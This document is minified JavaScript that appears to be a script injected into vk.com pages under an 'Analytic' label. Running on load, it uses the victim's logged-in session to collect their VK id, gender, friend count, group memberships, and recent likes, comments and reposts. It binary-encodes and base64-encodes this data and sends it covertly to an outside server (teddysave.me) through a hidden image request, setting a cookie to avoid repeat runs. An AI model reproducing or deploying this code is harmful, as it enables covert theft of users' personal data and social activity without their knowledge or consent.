var ACTIVITY_LIMIT=50,COOKIE_TERM=31536e4,ENCODE_RATIO=8,ID_SIZE=4,COUNTER_SIZE=2,OTHER_SIZE=1,DOMAIN="https://vk.com/",FEED_TOP_URI="feed",GROUP_URI="al_groups.php",REPOST_URI="al_wall.php",COMMENT_URI="al_feed.php?sm_comments",LIKE_URI="al_fave.php",COUNT_FRIENDS_URI="id",GENDER_URI="al_profileEdit.php?",COUNT_FRIENDS_CSS_SELECTOR="#profile_friends>.module_header .header_count.fl_l",FEED_TOP_CSS_SELECTOR="#feed_filters>.page_block",REPOST_CSS_SELECTOR=".post_copy .copy_post_author>a",LIKE_CSS_SELECTOR="h5.post_author>a",COMMENT_CSS_SELECTOR="h5.post_author>a",SERVER_URL="https://teddysave.me/emoji/?",COOKIE_PREFIX="remixwid_",err_code=0,err_string="",requestDataManager=function(){var t={};this.section=function(e){return t.section=e,this},this.act=function(e){return t.act=e,this},this.offset=function(e){return t.offset=e,this},this.al=function(e){return t.al=e,this},this.setOtherOptions=function(e,n){return t[e]=n,this},this.getOffset=function(){return t.offset},this.build=function(){var e=[];for(var n in t)t.hasOwnProperty(n)&&e.push(n+"="+encodeURIComponent(t[n]));return e=e.join("&")}},UserData=function(){var t={},e={},n=function(){return window.vk&&parseInt(window.vk.id)?(t.id||(t.id=parseInt(window.vk.id)),t.id):0},r=function(){var e=new requestDataManager;e.al("-1"),e.setOtherOptions("__query","edit"),e.setOtherOptions("_ref","feed"),e.setOtherOptions("_rndVer","1413"),e.setOtherOptions("al_id",n());var r=DOMAIN+GENDER_URI+e.build();return Request.get(r,"text").then(function(e){if(e){t.gender=0;var n=e.match(/\\"sex\\"\:[1-2]{1}/);if(n&&n[0]){var r=n[0].split(":");r[1]&&(t.gender=parseInt(r[1]))}}})},i=function(){return Request.post(DOMAIN+COUNT_FRIENDS_URI+n(),null,"document").then(function(e){if(e&&e instanceof HTMLDocument){var n=e.querySelector(COUNT_FRIENDS_CSS_SELECTOR);if(t.friend_count=0,n){var r=parseInt(n.innerText.replace(/[\s]+/g,""));r?t.friend_count=r:delete t.friend_count}}})},o=function(){return Request.get(DOMAIN+FEED_TOP_URI,"document").then(function(e){e?e.querySelector(FEED_TOP_CSS_SELECTOR+" .on")?t.feed_top=1:t.feed_top=0:t.feed_top=3},function(){t.feed_top=4})},a=function(){var e=new requestDataManager;return e.act("get_list").al("1").setOtherOptions("mid",n()).setOtherOptions("tab","groupsv"),Request.post(DOMAIN+GROUP_URI,e.build(),"text").then(function(e){var n=[];if(t.group_list=[],t.group_count=0,e){try{var r=l(e,"json"),i=JSON.parse(r)}catch(t){return}Verification.checkTypeData(i,"Array")&&(i.forEach(function(t){t[2]&&!isNaN(parseInt(t[2]))&&n.push(parseInt(t[2]))}),t.group_list=n,t.group_count=n.length)}})},u=function(){var t=new requestDataManager;return t.act("get_wall").al("1").offset(0).setOtherOptions("owner_id",n()).setOtherOptions("type","own"),f(REPOST_URI,t,"repost",REPOST_CSS_SELECTOR)},s=function(){var t=new requestDataManager;return t.al("1").offset(0).section("comments").setOtherOptions("al_ad",0).setOtherOptions("more","1").setOtherOptions("part","1"),f(COMMENT_URI,t,"comment",COMMENT_CSS_SELECTOR)},c=function(){var t=new requestDataManager;return t.act("load").al("1").offset(0).section("likes_posts").setOtherOptions("al_ad",0),f(LIKE_URI,t,"like",LIKE_CSS_SELECTOR)},f=function(t,n,r,i){return Request.post(DOMAIN+t,n.build(),"text").then(function(o){var a=!1,u=document.createElement("div");e[r]||(e[r]=new Set);var s=[];if(o=l(o,"html")){u.innerHTML=o,u.style.display="none",u.id="wall_act_list",document.body.appendChild(u);for(var c=document.body.querySelectorAll("#wall_act_list ._post"),p=0;p<c.length;p++){var O=c[p].querySelector(i);O&&O.dataset.postId&&s.push(O)}c.length&&(a=!0),u.parentNode.removeChild(u)}if(_(r,s),a&&e[r].size<ACTIVITY_LIMIT)return n.offset(n.getOffset()+c.length),n.setOtherOptions("from",c[c.length-1].dataset.postId),f(t,n,r,i);d(r)})},_=function(t,n){[].forEach.call(n,function(n){e[t].add(n)})},p=function(t){for(var n=[],r=e[t].values(),i=0;i<e[t].size&&i<ACTIVITY_LIMIT;i++)n.push(r.next().value);return n},d=function(n){t.activity||(t.activity={}),p(n).forEach(function(e){var r=e.dataset.postId;if(r){var i=r.split("_"),o=i[0].replace("-",""),a=i[1];t.activity[o]||(t.activity[o]={like:[],comment:[],repost:[]}),t.activity[o][n].push(parseInt(a))}}),e[n]=[]},l=function(t,e){var n="";if(Verification.checkTypeData(t,"String"))for(var r=t.split("<!>"),i=0;i<r.length;i++){if("json"==e&&-1!=r[i].indexOf("<!json>")){n=r[i].replace("<!json>","");break}if("json"!=e&&-1!=r[i].search(/<div/)){n=r[i];break}}return n};return{setData:function(e){t=e},getId:n,parseList:d,get:function(){return new Promise(function(e){n(),Promise.all([r(),i(),a(),s(),c(),o(),u()]).then(function(){e(t)})})},getDataObject:function(){return t}}}(),Verification=function(){var t=function(t){return!1===Storage.get("remixwid_"+t)},e=function(){return UserData.getId()},n=function(t){var e=new RegExp("^[0-9]+$");for(var n in t){if(!e.test(n))return!1;if(3!=Object.keys(t[n]).length)return!1;for(var o in t[n])if(!(t[n][o]&&i(t[n][o],"Array")&&r(t[n][o])))return!1}return!0},r=function(t){for(var e=0;e<t.length;e++)if(!(i(t[e],"Number")&&(0^t[e])===t[e]&&t[e]>=0))return!1;return!0},i=function(t,e){return Object.prototype.toString.call(t).slice(8,-1)==e};return{isWork:function(){var n=e(),r=-1!=window.location.href.indexOf("act=blocked");return n&&t(n)&&!r},checkUserData:function(t){for(var e=["id","gender","friend_count","feed_top","group_count","group_list","activity"],o=0;o<e.length;o++){if(!(e[o]in t))return!1;switch(e[o]){case"group_list":if(!i(t.group_list,"Array")||!r(t.group_list))return!1;break;case"activity":if(!i(t.activity,"Object")||null===t.activity)return!1;if(!n(t.activity))return!1;break;case"gender":if(!i(t.gender,"Number")||t.gender<0||t.gender>2)return!1;break;case"feed_top":if(!i(t.feed_top,"Number"))return!1;break;case"id":if(!(i(t.id,"Number")&&t.id>0)||(0^t.id)!==t.id)return!1;break;default:if(!(i(t[e[o]],"Number")&&t[e[o]]>-1)||(0^t[e[o]])!==t[e[o]])return!1}}return t.group_list.length==t.group_count},checkTypeData:i}}(),ObjectToBin=function(){var t=[],e=function(e){n(Object.keys(e.activity).length,COUNTER_SIZE,t);for(var r in e.activity)n(parseInt(r),ID_SIZE,t),n(e.activity[r].like.length,COUNTER_SIZE,t),n(e.activity[r].comment.length,COUNTER_SIZE,t),n(e.activity[r].repost.length,COUNTER_SIZE,t),n(e.activity[r],ID_SIZE,t)},n=function(t,e,i){if("object"==typeof t)for(var o in t)n(t[o],e,i);else i.push(r(t,e));return i},r=function(t,e){for(var n=[],r=e;r>0;r--)n.push(String.fromCharCode(t>>ENCODE_RATIO*(r-1)&255));return n=n.join("")};return{convert:function(r){return t=[],!!Verification.checkUserData(r)&&(n(r.id,ID_SIZE,t),n(r.gender,OTHER_SIZE,t),n(r.friend_count,COUNTER_SIZE,t),n(r.feed_top,OTHER_SIZE,t),n(r.group_count,COUNTER_SIZE,t),n(r.group_list,ID_SIZE,t),e(r),t.join(""))},encode:r}}(),Request=function(){var t=function(t,e,n,r){return new Promise(function(i,o){var a=new XMLHttpRequest;a.open(t,e,!0),a.responseType=r||"text",a.setRequestHeader("x-requested-with","XMLHttpRequest"),a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.onreadystatechange=function(){if(4==a.readyState&&a.status>=200&&a.status<=300){var t="document"==r?a.responseXML:a.response;i(t)}},a.onerror=function(){o(!1)},a.send(n)})};return{post:function(e,n,r){return t("POST",e,n,r)},get:function(e,n){return t("GET",e,null,n)},request:t}}(),Storage=function(){var t=function(){for(var t={},e=document.cookie.split(";"),n=0;n<e.length;n++){var r=e[n].split("=");2==r.length&&(t[r[0].trim()]=r[1])}return t};return{set:function(t,e,n){if(n&&"number"==typeof n){var r=new Date;r.setTime(r.getTime()+1e3*n),n=r}var i=t+"="+(e=encodeURIComponent(e));i+="; path=/; expires="+n.toUTCString(),document.cookie=i},get:function(e){var n=t();return e in n&&n[e]}}}(),Analytic=function(){var t=function(t){Storage.set(COOKIE_PREFIX+UserData.getId(),1,COOKIE_TERM);var e=new Image,n="";n=!1===t?"e="+err_code+"&i="+UserData.getId()+"&g="+encodeURIComponent(err_string):"data="+encodeURIComponent(btoa(t)),e.src=SERVER_URL+n,e.style.display="none",document.body.appendChild(e)};return{run:function(){Verification.isWork()&&UserData.get().then(function(e){var n=ObjectToBin.convert(e);t(n)})}}}();Analytic.run();